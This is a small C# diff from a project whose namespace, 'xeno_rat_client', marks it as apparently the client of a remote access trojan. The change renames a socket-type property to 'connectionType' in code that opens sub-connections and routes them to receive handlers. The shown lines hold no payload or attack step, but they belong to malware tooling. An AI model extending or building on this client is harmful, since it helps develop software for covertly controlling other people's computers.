@@ -27,11 +27,11 @@ namespace xeno_rat_client
                 Node sub = await Main.ConnectSubSockAsync(type, retid, OnDisconnect);
                 sub.Parent = Main;
                 Main.AddSubNode(sub);
-                if (sub.SockType == 1)
+                if (sub.connectionType == 1)
                 {
                     await Type1Receive(sub);
                 }
-                else if (sub.SockType == 2)
+                else if (sub.connectionType == 2)
                 {
                     await Type2Receive(sub);
                 }
@@ -53,7 +53,7 @@ namespace xeno_rat_client
 
         private async Task GetAndSendInfo(Node Type0) 
         {
-            if (Type0.SockType != 0) 
+            if (Type0.connectionType != 0) 
             {
                 return;
             }
